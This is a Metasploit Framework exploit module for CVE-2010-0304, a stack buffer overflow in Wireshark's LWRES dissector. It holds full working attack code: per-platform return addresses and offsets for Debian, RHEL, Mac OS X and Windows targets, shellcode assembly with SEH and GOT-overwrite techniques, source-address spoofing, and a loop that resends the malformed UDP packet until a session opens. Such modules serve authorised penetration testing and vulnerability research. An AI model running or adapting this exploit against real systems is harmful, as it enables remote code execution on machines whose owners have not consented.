Wireshark LWRES Dissector getaddrsbyname_request Buffer Overflow (loop)
=======================================================================

##
# $Id: wireshark_lwres_getaddrbyname.rb 8364 2010-02-03 18:24:42Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require &#039;msf/core&#039;
#require &#039;racket&#039;

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::Udp
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			&#039;Name&#039;			=> &#039;Wireshark LWRES Dissector getaddrsbyname_request Buffer Overflow (loop)&#039;,
			&#039;Description&#039;	=> %q{
					The LWRES dissector in Wireshark version 0.9.15 through 1.0.10 and 1.2.0 through
				1.2.5 allows remote attackers to execute arbitrary code due to a stack-based buffer
				overflow. This bug found and reported by babi.

				This particular exploit targets the dissect_getaddrsbyname_request function. Several
				other functions also contain potentially exploitable stack-based buffer overflows.

				exploitation via the return address on the stack. Sending a larger string allows
				exploitation using the SEH bypass method. However, this packet will usually get
				fragmented, which may cause additional complications.

				NOTE: The vulnerable code is reached only when the packet dissection is rendered.
				If the packet is fragmented, all fragments must be captured and reassembled to
				exploit this issue.

				This version loops, sending the packet every X seconds until the job is killed.
			},
			&#039;Author&#039;		=>
				[
					&#039;babi&#039;,   # original discovery/exploit
					&#039;jduck&#039;,  # ported from public exploit
					&#039;redsand&#039; # windows target/testing
				],
			&#039;License&#039;		=> MSF_LICENSE,
			&#039;Version&#039;		=> &#039;$Revision: 8364 $&#039;,
			&#039;References&#039;	=>
				[
					[ &#039;CVE&#039;, &#039;2010-0304&#039; ],
					[ &#039;OSVDB&#039;, &#039;61987&#039; ],
					[ &#039;BID&#039;, &#039;37985&#039; ],
					[ &#039;URL&#039;, &#039;http://www.wireshark.org/security/wnpa-sec-2010-02.html&#039; ],
					[ &#039;URL&#039;, &#039;http://anonsvn.wireshark.org/viewvc/trunk-1.2/epan/dissectors/packet-lwres.c?view=diff&r1=31596&r2=28492&diff_format=h&#039; ]
				],
			&#039;DefaultOptions&#039; =>
				{
					&#039;EXITFUNC&#039; => &#039;process&#039;,
				},
			&#039;Privileged&#039;	=> true, # at least capture privilege
			&#039;Payload&#039;		=>
				{
					&#039;Space&#039;       => 512,
					&#039;BadChars&#039;    => "\x00",
					&#039;DisableNops&#039; => true,
				},
			&#039;DefaultTarget&#039;	=> 4,
			&#039;Targets&#039;		=>
				[
					[ &#039;tshark 1.0.2-3+lenny7 on Debian 5.0.3 (x86)&#039;,
						# breakpoint: lwres.so + 0x2ce2
						{
							&#039;Arch&#039;      => ARCH_X86,
							&#039;Platform&#039;  => &#039;linux&#039;,
							# conveniently, edx pointed at our string..
							# and so, we write it to g_slist_append&#039;s GOT entry just before its called.
							# pwnt.
							#
							#   mov [ebx+0xc],edx / jmp 0x804fc40 -->
							#    mov [esp+4],eax / mov eax,[edi+8] / mov [esp],eax / call g_slist_append
							#
							&#039;Ret&#039;       => 0x804fc85,    # see above..
							&#039;RetOff&#039;    => 376,
							&#039;Readable&#039;  => 0x804fa04,    # just anything
							&#039;GotAddr&#039;   => 0x080709c8    # objdump -R tshark | grep g_slist_append
						}
					],
					[ &#039;wireshark 1.0.2-3+lenny7 on Debian 5.0.3 (x86)&#039;,
						{
							&#039;Arch&#039;      => ARCH_X86,
							&#039;Platform&#039;  => &#039;linux&#039;,
							# the method for tshark doesn&#039;t work, since there aren&#039;t any convenient
							# pointers lying around (in reg/close on stack)
							#
							# since the wireshark bin has a jmp esp, we&#039;ll just use that method..
							&#039;Ret&#039;       => 0x818fce8,    # jmp esp in wireshark bin
							&#039;RetOff&#039;    => 376,
							&#039;Readable&#039;  => 0x8066a40,    # just any old readable addr (unused)
							&#039;GotAddr&#039;   => 0x818601c     # objdump -R wireshark | grep g_slist_append (unused)
						}
					],

					[ &#039;wireshark 1.2.5 on RHEL 5.4 (x64)&#039;,
						{
							&#039;Arch&#039;      => ARCH_X86_64,
							&#039;Platform&#039;  => &#039;linux&#039;,
							&#039;Ret&#039;       => 0xfeedfed5deadbeef,
							&#039;RetOff&#039;    => 152,
						}
					],

					[ &#039;wireshark 1.2.5 on Mac OS X 10.5 (x86)&#039;,
						{
							&#039;Arch&#039;      => ARCH_X86,
							&#039;Platform&#039;  => &#039;osx&#039;,
							&#039;Ret&#039;       => 0xdeadbeef,
							&#039;RetOff&#039;    => 268,
						}
					],

					# The following target was tested against Windows XP SP3 and Windows Vista
					[ &#039;wireshark/tshark 1.2.1 and 1.2.5 on Windows (x86)&#039;,
						{
							&#039;Arch&#039;      => ARCH_X86,
							&#039;Platform&#039;  => &#039;win&#039;,
							# NOTE: due to the length of this packet, your mileage may vary.
							&#039;Ret&#039;       => 0x61B4121B,
							# 0x655810b6 = pop/pop/ret in libpango
							# 0x02A110B6 = pop/pop/ret in libgtk-w
							# 0x03D710CC = pop/mov/pop/ret in packet
							# 0x61B4121B = pop/pop/ret in pcre3
							&#039;RetOff&#039;    => 2128,
						}
					],
				],
			&#039;DisclosureDate&#039; => &#039;Jan 27 2010&#039;,
			# Set it to passive mode to background it.
			&#039;Stance&#039; => Msf::Exploit::Stance::Passive))

		register_options([
			Opt::RPORT(921),
			Opt::RHOST("239.255.255.250"),
			OptAddress.new(	&#039;SHOST&#039;, [false, &#039;This option can be used to specify a spoofed source address&#039;, nil]),
			OptInt.new(		&#039;DELAY&#039;, [true,  &#039;This option sets the delay between sent packets&#039;, 5])
		], self.class)

		register_advanced_options([
			OptBool.new("ExitOnSession", [ false, "Return from the exploit after a session has been created", true ])
		], self.class)

		deregister_options(&#039;FILTER&#039;,&#039;PCAPFILE&#039;)
	end

	def exploit

		ret_offset = target[&#039;RetOff&#039;]

		# we have different techniques depending on the target
		if (target == targets[0])
			# debian tshark
			str = make_nops(ret_offset - payload.encoded.length - 16)
			str << payload.encoded
			str << [target[&#039;GotAddr&#039;] - 0xc].pack(&#039;V&#039;)
			str << rand_text(4)
			str << [target[&#039;Readable&#039;]].pack(&#039;V&#039;)
			str << rand_text(4)
			# ret is next
		elsif (target == targets[1])
			fix_esp = Metasm::Shellcode.assemble(Metasm::Ia32.new, "add esp,-3500").encode_string
			str = make_nops(ret_offset - fix_esp.length - payload.encoded.length)
			str << fix_esp
			str << payload.encoded
			# jmp esp...
			str << [target.ret].pack(&#039;V&#039;)
			# jump back
			distance = ret_offset + 4
			str << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-" + distance.to_s).encode_string
		elsif (target == targets[4])
			# ugh, /GS and UDP length issues :-/
			str = make_nops(ret_offset - payload.encoded.length)
			str << payload.encoded
			str << generate_seh_record(target.ret)
			# jump back
			distance = ret_offset + 8
			str << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-" + distance.to_s).encode_string
		else
			# this is just a simple DoS payload
			str = Rex::Text.pattern_create(ret_offset)
			#str << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $+6").encode_string
		end

		# add return address
		#XXX: this isn&#039;t working?
		#str << Rex::Arch.pack_addr(target.arch, target.ret)
		str << [target.ret].pack(&#039;V&#039;)

		# form the packet&#039;s payload!
		sploit =  "\x00\x00\x01\x5d\x00\x00\x00\x00\x4b\x49\x1c\x52\x00\x01\x00\x01"
		sploit << "\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		sploit << "\x00\x00\x00\x01"
		sploit << [str.length].pack(&#039;n&#039;)
		sploit << str
		sploit << "\x00\x00"

		shost = datastore[&#039;SHOST&#039;]
		if (shost)
			print_status("Sending malformed LWRES packet to #{rhost} (spoofed from #{shost})")
			open_pcap

			n = Racket::Racket.new

			n.l3 = Racket::L3::IPv4.new
			n.l3.src_ip = datastore[&#039;SHOST&#039;] || Rex::Socket.source_address(rhost)
			n.l3.dst_ip = rhost
			n.l3.protocol = 6
			n.l3.id = rand(0x10000)
			n.l3.ttl = 64

			n.l4 = Racket::L4::UDP.new
			n.l4.src_port = rand((2**16)-1024)+1024
			n.l4.dst_port = datastore[&#039;RPORT&#039;].to_i

			n.l4.payload  = sploit

			n.l4.fix!(n.l3.src_ip, n.l3.dst_ip)
			pkt = n.pack

			while true
				break if session_created? and datastore[&#039;ExitOnSession&#039;]
				capture_sendto(pkt, rhost)
				sleep(datastore[&#039;DELAY&#039;])
			end
			
			close_pcap

			handler
		else
			print_status("Sending malformed LWRES packet to #{rhost} every #{datastore[&#039;DELAY&#039;]} seconds.")

			handler

			while true
				break if session_created? and datastore[&#039;ExitOnSession&#039;]
				connect_udp
				udp_sock.put(sploit)
				disconnect_udp
				sleep(datastore[&#039;DELAY&#039;])
			end
		end

	end

end




